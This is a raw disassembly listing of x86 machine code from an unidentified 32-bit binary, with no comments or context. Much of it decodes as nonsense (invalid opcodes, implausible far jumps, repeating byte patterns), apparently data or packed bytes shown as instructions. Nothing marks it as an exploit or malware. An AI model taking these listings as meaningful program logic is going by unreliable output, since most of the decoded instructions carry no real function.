  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x8f0be75c
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [esi-0x5fffffa],al
  41edc3:	cmp    BYTE PTR [esi+0x7594f972],cl
  41edc9:	sub    al,0x8e
  41edcb:	retf   
  41edcc:	dec    edx
  41edcd:	xchg   edx,eax
  41edce:	rcr    BYTE PTR [edx+0x5a],0xde
  41edd2:	pushf  
  41edd3:	inc    eax
  41edd4:	xor    al,0xa7
  41edd6:	sbb    BYTE PTR [ecx-0x27],dh
  41edd9:	xor    DWORD PTR [ecx+eiz*4],esp
  41eddc:	out    0x59,al
  41edde:	fisub  DWORD PTR [ecx]
  41ede0:	and    esi,esi
  41ede2:	sar    BYTE PTR [ebp-0x4d],0x29
  41ede6:	xchg   ebx,eax
  41ede7:	aas    
  41ede8:	push   ds
  41ede9:	cwde   
  41edea:	rcl    esp,1
  41edec:	or     eax,0xb6662dd7
  41edf1:	xchg   BYTE PTR [esp+edi*1],dh
  41edf4:	mov    bl,0x6d
  41edf6:	mov    ch,0xd5
  41edf8:	add    al,BYTE PTR [edi+esi*8]
  41edfb:	mov    esp,0x6c650e64
  41ee00:	add    eax,0x2d391113
  41ee05:	sub    dl,ah
  41ee07:	xchg   esi,eax
  41ee08:	ins    BYTE PTR es:[edi],dx
  41ee09:	push   ebp
  41ee0a:	stc    
  41ee0b:	adc    bh,BYTE PTR [edi]
  41ee0d:	shr    DWORD PTR [ebp-0x21],cl
  41ee10:	sahf   
  41ee11:	outs   dx,DWORD PTR ds:[esi]
  41ee12:	mov    edi,0xaf5b3e75
  41ee17:	iret   
  41ee18:	mov    ecx,0x51c07c0a
  41ee1d:	fidiv  DWORD PTR [edx+0x2a]
  41ee20:	mov    esi,0x5f3d4d3e
  41ee25:	jecxz  0x41edfe
  41ee27:	or     ecx,ebp
  41ee29:	rcr    eax,1
  41ee2b:	or     esp,DWORD PTR [edi]
  41ee2d:	mov    esi,0xd2bccb7b
  41ee32:	adc    al,0xf4
  41ee34:	ret    
  41ee35:	add    eax,DWORD PTR [edx+0x59]
  41ee38:	sub    eax,ebp
  41ee3a:	imul   esp,ebx,0x87bd8f93
  41ee40:	sbb    eax,0xe9288059
  41ee45:	cmp    BYTE PTR [eax+0x57],bl
  41ee48:	test   eax,0x43c1f628
  41ee4d:	mov    esi,0x471f6eef
  41ee52:	sti    
  41ee53:	into   
  41ee54:	(bad)  
  41ee55:	into   
  41ee56:	push   cs
  41ee57:	jae    0x41ee67
  41ee59:	mov    gs,WORD PTR [ebx]
  41ee5b:	mov    ch,0x20
  41ee5d:	sbb    DWORD PTR [ecx+0x787fe249],0x95c7c6da
  41ee67:	push   cs
  41ee68:	sub    DWORD PTR [eax-0x6d],ebx
  41ee6b:	cmp    edx,DWORD PTR [ebp+0x3874c736]
  41ee71:	mov    al,ds:0xa9937158
  41ee76:	push   eax
  41ee77:	or     eax,0xd1c2b27b
  41ee7c:	push   esp
  41ee7d:	xchg   ebp,eax
  41ee7e:	ds sti 
  41ee80:	xchg   ebp,eax
  41ee81:	clc    
  41ee82:	push   eax
  41ee83:	sub    ah,BYTE PTR [ecx]
  41ee85:	jnp    0x41eec7
  41ee87:	mov    cl,0xb9
  41ee89:	jle    0x41eefc
  41ee8b:	scas   eax,DWORD PTR es:[edi]
  41ee8c:	cs popf 
  41ee8e:	xor    al,0x9f
  41ee90:	jb     0x41eee7
  41ee92:	push   eax
  41ee93:	xchg   esi,eax
  41ee94:	adc    DWORD PTR [esi],ebx
  41ee96:	pop    ecx
  41ee97:	lods   eax,DWORD PTR ds:[esi]
  41ee98:	jnp    0x41eec2
  41ee9a:	repnz push 0x37
  41ee9d:	and    bl,BYTE PTR [ecx]
  41ee9f:	pop    ebp
  41eea0:	adc    dl,BYTE PTR [ebp+0x24673bb6]
  41eea6:	mov    bh,0x84
  41eea8:	xor    dl,BYTE PTR [ebx-0x66]
  41eeab:	dec    edi
  41eeac:	and    al,0x92
  41eeae:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeb0:	dec    esi
  41eeb1:	fwait
  41eeb2:	enter  0xddf3,0xb6
  41eeb6:	mov    edx,0x710d51e6
  41eebb:	call   0x5e940941
  41eec0:	xor    bl,BYTE PTR [eax+0x67]
  41eec3:	and    BYTE PTR [ebp+0x3f],dl
  41eec6:	iret   
  41eec7:	adc    ch,0x2b
  41eeca:	iret   
  41eecb:	pop    edx
  41eecc:	int    0x48
  41eece:	dec    ebp
  41eecf:	shl    esi,cl
  41eed1:	ss rdtsc 
  41eed4:	jp     0x41ef08
  41eed6:	jmp    0xda3d:0x866f9509
  41eedd:	sti    
  41eede:	jmp    0x3501:0x4dc1d061
  41eee5:	outs   dx,DWORD PTR ds:[esi]
  41eee6:	pop    ecx
  41eee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eee8:	std    
  41eee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeea:	or     BYTE PTR [ebp-0x4e],cl
  41eeed:	pop    ebx
  41eeee:	fistp  QWORD PTR [eax-0x4e5e56fa]
  41eef4:	test   BYTE PTR [ebx+0x5727b45a],cl
  41eefa:	test   DWORD PTR [edi],edi
  41eefc:	mov    eax,ds:0xe52330ea
  41ef01:	es (bad) 
  41ef03:	cmc    
  41ef04:	pop    ebp
  41ef05:	cmc    
  41ef06:	push   ecx
  41ef07:	loopne 0x41ef17
  41ef09:	cld    
  41ef0a:	popf   
  41ef0b:	sub    edi,esi
  41ef0d:	stos   BYTE PTR es:[edi],al
  41ef0e:	or     dl,BYTE PTR ds:[esi+0x3b]
  41ef12:	cmp    ecx,DWORD PTR [eax-0x1a]
  41ef15:	cwde   
  41ef16:	push   ss
  41ef17:	ja     0x41ef68
  41ef19:	retf   
  41ef1a:	je     0x41ef6f
  41ef1c:	pop    esp
  41ef1d:	add    BYTE PTR [ecx+0x2e],0xa9
  41ef21:	sbb    BYTE PTR [eax],0xee
  41ef24:	loope  0x41ef9d
  41ef26:	pop    ds
  41ef27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef28:	or     bl,BYTE PTR ds:0x16f848b6
  41ef2e:	test   DWORD PTR [edi],ebx
  41ef30:	jnp    0x41ef43
  41ef32:	jl     0x41ef07
  41ef34:	lahf   
  41ef35:	jns    0x41eeda
  41ef37:	leave  
  41ef38:	xchg   esp,edx
  41ef3a:	adc    eax,0xd2ee7405
  41ef3f:	imul   edx,ebx,0x9b89432f
  41ef45:	inc    ebx
  41ef46:	sbb    al,0xb8
  41ef48:	jmp    esp
  41ef4a:	and    ah,BYTE PTR [ecx+0x40]
  41ef4d:	in     al,dx
  41ef4e:	mov    edi,0x97f1641a
  41ef53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef54:	imul   esi,DWORD PTR [esi-0x28],0xa57f1123
  41ef5b:	iret   
  41ef5c:	push   0xffffff80
  41ef5e:	out    0xe8,al
  41ef60:	(bad)  
  41ef61:	sti    
  41ef62:	ret    0xceec
  41ef65:	xor    edx,ebx
  41ef67:	hlt    
  41ef68:	adc    ah,cl
  41ef6a:	xor    dl,BYTE PTR [edx+0x64]
  41ef6d:	shl    DWORD PTR [ebp-0x21],1
  41ef70:	dec    ecx
  41ef71:	jmp    0x41ef0a
  41ef73:	cmc    
  41ef74:	lds    esp,FWORD PTR [esi+0x106b1681]
  41ef7a:	cmp    al,0xc
  41ef7c:	xchg   ebx,eax
  41ef7d:	in     al,0xf8
  41ef7f:	fld    TBYTE PTR [ecx+eiz*4]
  41ef82:	mov    esp,0x42764fde
  41ef87:	push   edi
  41ef88:	sub    al,0xce
  41ef8a:	sbb    eax,esi
  41ef8c:	mov    ds:0x235a5a64,eax
  41ef91:	(bad)  
  41ef92:	dec    edx
  41ef93:	mov    bl,0xa7
  41ef95:	arpl   WORD PTR [edi+0x6985ffc3],ax
  41ef9b:	(bad)  
  41ef9c:	dec    esi
  41ef9d:	mov    BYTE PTR [ecx],bl
  41ef9f:	pop    ss
  41efa0:	bound  esi,QWORD PTR [ebp+0x6c149358]
  41efa6:	(bad)  
  41efa7:	push   esi
  41efa8:	fsubr  DWORD PTR [ebp+ebx*8-0x3877e77f]
  41efaf:	push   esp
  41efb0:	pop    esp
  41efb1:	sub    eax,0x45a2bd31
  41efb6:	adc    ebp,DWORD PTR [esi-0x22]
  41efb9:	jbe    0x41f038
  41efbb:	fld    st(0)
  41efbd:	or     dl,0xe8
  41efc0:	mov    ds:0xc0aa6e9a,eax
  41efc5:	(bad)  
  41efc6:	pop    esp
  41efc7:	sar    edx,1
  41efc9:	and    BYTE PTR [edx+0x686a4935],cl
  41efcf:	loopne 0x41efd0
  41efd1:	in     eax,dx
  41efd2:	in     al,dx
  41efd3:	pop    edi
  41efd4:	dec    edx
  41efd5:	call   0x5b7e6669
  41efda:	lahf   
  41efdb:	push   cs
  41efdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efdd:	dec    esp
  41efde:	pop    ecx
  41efdf:	call   0xd26483a4
  41efe4:	fcmovnbe st,st(5)
  41efe6:	test   al,0xf4
  41efe8:	rol    BYTE PTR [eax+ecx*8],1
  41efeb:	iret   
  41efec:	test   BYTE PTR [esi+0x4f64984b],ah
  41eff2:	idiv   al
  41eff4:	add    BYTE PTR [eax+0x37],ah
  41eff7:	push   es
  41eff8:	sub    eax,0xbebe7232
  41effd:	mov    es,WORD PTR [esi]
  41efff:	iret   
  41f000:	push   ds
  41f001:	retf   0x3820
  41f004:	rcr    BYTE PTR [ebx-0x4b14e110],0xcb
  41f00b:	mov    dh,0x43
  41f00d:	mov    al,ds:0xc1385c1
  41f012:	aam    0x7e
  41f014:	add    edi,DWORD PTR ds:0x2a78c3ac
  41f01a:	in     al,dx
  41f01b:	ret    0x35d9
  41f01e:	cmp    edi,ebx
  41f020:	inc    ebx
  41f021:	add    dh,BYTE PTR [edi+0x59]
  41f024:	test   eax,0x61bb4647
  41f029:	fidiv  DWORD PTR [edx]
  41f02b:	and    ah,BYTE PTR [ecx+0x52f28359]
  41f031:	iret   
  41f032:	cmp    ebp,DWORD PTR [ebx+0x7]
  41f035:	aad    0xcc
  41f037:	(bad)  
  41f038:	push   esp
  41f039:	sbb    DWORD PTR [edx],ebp
  41f03b:	dec    edi
  41f03c:	loope  0x41f065
  41f03e:	or     DWORD PTR [ebx],esi
  41f040:	pop    edx
  41f041:	add    ebp,DWORD PTR [ebp-0x2c]
  41f044:	sbb    ebp,ebx
  41f046:	addr16 pop es
  41f048:	jno    0x41f0a7
  41f04a:	pop    ds
  41f04b:	ret    0xc824
  41f04e:	test   esp,0x82b7ab95
  41f054:	out    dx,eax
  41f055:	mov    edx,0x9eeaef1c
  41f05a:	adc    esp,esp
  41f05c:	pop    ebp
  41f05d:	jl     0x41f041
  41f05f:	sbb    eax,0x9a2ba9e6
  41f064:	test   DWORD PTR [edx+0x22],edx
  41f067:	test   DWORD PTR [edi+ecx*2+0x37],eax
  41f06b:	out    0xbd,eax
  41f06d:	and    ecx,DWORD PTR [edi+0x173dfa5b]
  41f073:	and    al,0x2
  41f075:	pop    edx
  41f076:	je     0x41f02c
  41f078:	hlt    
  41f079:	sub    BYTE PTR [edi+0x23],al
  41f07c:	in     al,dx
  41f07d:	cmp    eax,0x38d05c1d
  41f082:	rcr    esp,cl
  41f084:	in     al,0xd4
  41f086:	add    al,0x9f
  41f088:	aam    0xa3
  41f08a:	mov    ah,bl
  41f08c:	(bad)  
  41f08d:	mov    edi,0x843c1908
  41f092:	xor    BYTE PTR [edi-0x17473392],bh
  41f098:	das    
  41f099:	(bad)  
  41f09a:	in     al,dx
  41f09b:	mov    al,ds:0xa9582b1c
  41f0a0:	pop    ss
  41f0a1:	(bad)  
  41f0a2:	mov    bh,0xbb
  41f0a4:	loopne 0x41f02b
  41f0a6:	sbb    esp,0xc175748
  41f0ac:	pop    esi
  41f0ad:	mov    ch,0xe8
  41f0af:	xor    ah,0x18
  41f0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b3:	mov    esi,0x32372e30
  41f0b8:	jo     0x41f0b9
  41f0ba:	rcr    BYTE PTR [eax],cl
  41f0bc:	fcom   st(5)
  41f0be:	enter  0x5cd2,0x54
  41f0c2:	pop    esp
  41f0c3:	jg     0x41f064
  41f0c5:	out    0xb0,al
  41f0c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0c8:	sub    BYTE PTR [ebx],cl
  41f0ca:	sbb    eax,0x8216068b
  41f0cf:	imul   ecx,DWORD PTR [esi+0x7fcb8e35],0x77
  41f0d6:	jae    0x41f094
  41f0d8:	dec    ecx
  41f0d9:	sub    eax,0x6fa60e06
  41f0de:	cmp    ecx,esi
  41f0e0:	dec    ebx
  41f0e1:	dec    esp
  41f0e2:	inc    edx
  41f0e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0e4:	mov    ch,0xaf
  41f0e6:	push   edx
  41f0e7:	arpl   WORD PTR [esi-0x5ac2f54f],ax
  41f0ed:	sub    BYTE PTR [edx+edx*2],ah
  41f0f0:	lea    esp,[ebp+ebp*2+0x79]
  41f0f4:	inc    esp
  41f0f5:	arpl   WORD PTR [edx],bx
  41f0f7:	sub    eax,0xa688fab6
  41f0fc:	or     BYTE PTR [ecx+0x212fd651],dh
  41f102:	sbb    eax,0x22664ed
  41f107:	arpl   cx,si
  41f109:	aam    0x3a
  41f10b:	xor    bh,BYTE PTR [ecx]
  41f10d:	ins    DWORD PTR es:[edi],dx
  41f10e:	push   ss
  41f10f:	fld    st(7)
  41f111:	mov    WORD PTR [ebp-0x30],gs
  41f114:	pop    ebp
  41f115:	xchg   edi,eax
  41f116:	call   0xa6a2:0xe13e9491
  41f11d:	dec    ecx
  41f11e:	loopne 0x41f117
  41f120:	or     BYTE PTR [esp+ebx*2+0x6],ah
